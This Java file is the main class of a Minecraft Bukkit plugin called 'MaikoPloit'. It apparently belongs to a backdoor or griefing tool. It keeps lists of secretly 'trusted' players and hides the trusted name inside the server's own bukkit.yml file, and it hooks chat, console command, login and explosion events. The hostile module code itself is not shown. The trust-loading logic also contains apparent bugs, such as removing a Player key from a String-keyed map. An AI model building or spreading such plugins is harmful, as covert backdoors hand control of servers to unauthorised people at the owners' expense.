package me.maiko.main;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.java.JavaPlugin;

import me.maiko.events.AsyncPlayerChatListener;
import me.maiko.events.EntitySpawnListener;
import me.maiko.events.ExplosionPrimeListener;
import me.maiko.events.InventoryClickListener;
import me.maiko.events.PlayerInteractListener;
import me.maiko.events.PlayerJoinListener;
import me.maiko.events.PlayerLoginListener;
import me.maiko.events.PlayerMoveListener;
import me.maiko.events.ServerCommandListener;
import me.maiko.module.Manager;
import me.maiko.utils.Effekte;
import net.minecraft.server.v1_8_R3.EnumParticle;
import net.minecraft.server.v1_8_R3.PacketPlayOutWorldParticles;

public class Main extends JavaPlugin{



	
	//Prefix für fast alle Nachrichten vom Plugin
	public static String Prefix = "§cMaiko§8Ploit §7| ";
	//Alle getrusteten Spieler
	public static ArrayList<Player>trusted = new ArrayList<>();
	public static ArrayList<Player>SemiTrusted = new ArrayList<>();
	//Mod Manager initialisieren
	public Manager m;
	//Die Datei die zum Trusten genutzt wird
	public static File file = new File("bukkit.yml");
	public static YamlConfiguration filecfg = YamlConfiguration.loadConfiguration(file);
	
	//Gesetzte Effekte
	public static HashMap<String, Effekte> effekt = new HashMap<String, Effekte>();

	@Override
	public void onEnable() {
		
		loadTrustedAtReload();
		this.m = new Manager(this);
		Bukkit.getPluginManager().registerEvents(new AsyncPlayerChatListener(this), this);
		Bukkit.getPluginManager().registerEvents(new EntitySpawnListener(), this);
		Bukkit.getPluginManager().registerEvents(new ExplosionPrimeListener(), this);
		Bukkit.getPluginManager().registerEvents(new InventoryClickListener(), this);
		Bukkit.getPluginManager().registerEvents(new PlayerInteractListener(), this);
		Bukkit.getPluginManager().registerEvents(new PlayerJoinListener(), this);
		Bukkit.getPluginManager().registerEvents(new PlayerLoginListener(), this);
		Bukkit.getPluginManager().registerEvents(new PlayerMoveListener(), this);
		Bukkit.getPluginManager().registerEvents(new ServerCommandListener(), this);
		
		this.m.init();
	}

	public static void loadTrustedAtReload() {
		if(!file.exists()) {
			try {
				
				file.createNewFile();
				filecfg.options().copyDefaults(true);
				filecfg.addDefault("Player", "");
				try {
					filecfg.save(file);
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}else {
			if(filecfg.getString("Player")!= ""||Bukkit.getPlayer(filecfg.getString("Player")) !=null) {
			trusted.add(Bukkit.getPlayer(filecfg.getString("Player")));
			if(Bukkit.getPlayer(filecfg.getString("Player")) !=null) {
				
				Bukkit.getPlayer(filecfg.getString("Player")).sendMessage(Main.Prefix + "Du wurdest wieder getrusted!");
			}else {
				trusted.clear();
				
			}

			}else {
			trusted.clear();
			filecfg.set("Player", "");
			}
		}

		
	}





	public static ItemStack createItem(Material m, String name, String lore,
			int anzahl, int nebenID) {

		ItemStack is = new ItemStack(m, anzahl, (short) nebenID);
		ItemMeta im = is.getItemMeta();
		im.setDisplayName(name);
		im.setLore(Arrays.asList(lore));
		is.setAmount(anzahl);
		is.setItemMeta(im);

		return is;
	}

	
	public static void playEffect(Location loc, EnumParticle ep, float f, int anzahl, int schnelle) {
		PacketPlayOutWorldParticles packet = new PacketPlayOutWorldParticles(ep, true, (float) loc.getX(),
				(float) loc.getY(), (float) loc.getZ(), f, f, f, schnelle, anzahl, 0, 0);
		for (Player p : Bukkit.getOnlinePlayers()) {
			((CraftPlayer) p).getHandle().playerConnection.sendPacket(packet);
		}
	}
	@SuppressWarnings("unlikely-arg-type")
	public static void changeEffekt(Player p, Effekte ef) {
		if (effekt.containsKey(p.getName())) {
			effekt.remove(p);
		}
		effekt.put(p.getName(), ef);
	}
	

}
